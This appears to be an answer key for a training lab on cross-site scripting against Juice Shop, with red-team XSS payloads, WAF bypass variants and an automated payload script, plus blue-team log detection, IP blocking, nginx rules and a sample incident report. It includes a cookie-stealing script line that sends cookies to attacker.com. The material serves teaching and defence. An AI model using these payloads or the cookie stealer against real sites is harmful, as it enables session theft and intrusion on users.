# Exercise 03 Answers: XSS Attack & Web Application Firewall

## 🔴 Red Team Answers

### Successful XSS Payloads

#### 1. Search Box (DOM XSS)
```html
<iframe src="javascript:alert('XSS')">
```
**URL:** `http://<VPS_IP>:8080/#/search?q=<iframe src="javascript:alert('XSS')">`

#### 2. Track Order (Reflected XSS)
```html
<iframe src="javascript:alert('XSS')">
```
**URL:** `http://<VPS_IP>:8080/#/track-result?id=<iframe src="javascript:alert('XSS')">`

#### 3. Without Script Tags
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

#### 4. Cookie Stealer
```javascript
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

### Bypass Techniques That Work

#### URL Encoding
```
%3Cscript%3Ealert(1)%3C/script%3E
```

#### Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

#### Without Script Tag (Most Reliable)
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

#### Event Handler Variations
```html
<body/onload=alert(1)>
<div onmouseover=alert(1)>hover</div>
<input onblur=alert(1) autofocus><input autofocus>
```

### Complete XSS Attack Script

```bash
#!/bin/bash
# xss_attack.sh
TARGET="http://<VPS_IP>:8080"

declare -a PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg/onload=alert(1)>"
    "<iframe src=javascript:alert(1)>"
    "<body onload=alert(1)>"
    "<input onfocus=alert(1) autofocus>"
    "%3Cscript%3Ealert(1)%3C/script%3E"
    "<ScRiPt>alert(1)</sCrIpT>"
)

echo "XSS Attack Testing"
echo "==================="

for payload in "${PAYLOADS[@]}"; do
    echo -n "Testing: ${payload:0:30}... "
    
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        "$TARGET/rest/products/search?q=$payload")
    
    if [ "$CODE" == "200" ]; then
        echo "✓ Passed (may be vulnerable)"
    elif [ "$CODE" == "403" ]; then
        echo "✗ Blocked by WAF"
    else
        echo "? Response: $CODE"
    fi
done
```

---

## 🔵 Blue Team Answers

### Detection Commands

#### Real-Time XSS Detection
```bash
docker logs -f nginx-proxy 2>&1 | \
    grep -iE "(script|javascript:|onerror=|onload=|iframe|svg)"
```

#### Count XSS Attempts
```bash
docker logs nginx-proxy 2>&1 | \
    grep -ciE "(script|javascript:|onerror|onload|iframe|svg)"
```

#### Find Attacker IPs
```bash
docker logs nginx-proxy 2>&1 | grep -iE "(script|onerror)" | \
    awk '{print $1}' | sort | uniq -c | sort -rn
```

### Simple XSS Detection Script

```bash
#!/bin/bash
# xss_detector.sh

echo "🔍 XSS Detection Active..."

docker logs -f nginx-proxy 2>&1 | while read line; do
    if echo "$line" | grep -qiE "(script|javascript:|onerror|onload|iframe|svg)"; then
        echo "⚠️  XSS DETECTED: $line"
    fi
done
```

### Blocking Attacker via Docker

```bash
# Find attacker IP
ATTACKER=$(docker logs nginx-proxy 2>&1 | grep -iE "(script|onerror)" | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')

echo "Blocking XSS attacker: $ATTACKER"

# Block inside nginx container
docker exec nginx-proxy sh -c "echo 'deny $ATTACKER;' >> /etc/nginx/blocked.conf"
docker exec nginx-proxy nginx -s reload
```

### WAF Rules for Nginx (Optional Advanced)

```nginx
# XSS blocking rules (add to nginx.conf if you have server access)
location / {
    # Block script tags
    if ($request_uri ~* "(script|javascript:)") {
        return 403;
    }
    
    # Block event handlers
    if ($request_uri ~* "(onerror|onload|onclick)=") {
        return 403;
    }
    
    proxy_pass http://juice-shop:3000;
    add_header X-XSS-Protection "1; mode=block" always;
}
```

### Sample Incident Report

```
XSS ATTACK INCIDENT REPORT
==========================

Detection Time: 16:45
Attacker IP: 192.168.1.100
Attack Duration: 12 minutes

Attack Statistics:
- Total XSS attempts: 47
- Unique payloads: 12
- Blocked by WAF: 38
- Potentially successful: 9 (before WAF)

Attack Types:
- Script tag injection: 15
- Event handler (onerror): 18
- JavaScript protocol: 8
- SVG injection: 6

Vulnerable Endpoints Found:
1. /rest/products/search (reflected)
2. /#/track-result (DOM-based)
3. /#/search (DOM-based)

Successful Payloads (Before WAF):
1. <iframe src="javascript:alert('XSS')">
2. <img src=x onerror=alert(1)>
3. <svg/onload=alert(1)>

Response Timeline:
- 16:45 - XSS attempts detected in logs
- 16:50 - Attack pattern confirmed
- 16:55 - WAF rules implemented
- 17:00 - Attacker IP blocked
- 17:02 - Attack stopped

WAF Rules Implemented:
- Blocked <script> tags (encoded variants)
- Blocked javascript: protocol
- Blocked event handlers
- Added X-XSS-Protection header
- Added Content-Security-Policy

Recommendations:
1. Implement output encoding on all user input
2. Use Content-Security-Policy headers (strict)
3. Validate and sanitize input server-side
4. Use HttpOnly flag on all cookies
5. Conduct security code review
6. Consider DOM sanitization library (DOMPurify)
```

---

## 🎓 Learning Points

### XSS Types Explained

| Type | Location | Example |
|------|----------|---------|
| **Reflected** | Server response | Search results page |
| **Stored** | Database | Comments, profiles |
| **DOM-based** | Browser JS | URL fragments |

### Defense Layers

1. **Input Validation**
   - Whitelist allowed characters
   - Reject or encode special chars

2. **Output Encoding**
   - HTML encode: `&lt;script&gt;`
   - JavaScript encode in JS contexts
   - URL encode in URLs

3. **Content Security Policy**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **HttpOnly Cookies**
   - Prevents JavaScript access to cookies
   - Mitigates cookie theft

5. **WAF Rules**
   - Block known patterns
   - Rate limit suspicious requests

### Why WAF Alone Isn't Enough

```
Bypass: <img src=x onerror=alert(1)>
Bypass: <svg/onload=alert(1)>
Bypass: URL encoding, case variations, etc.
```

**Best Defense:** Fix the code + WAF as additional layer
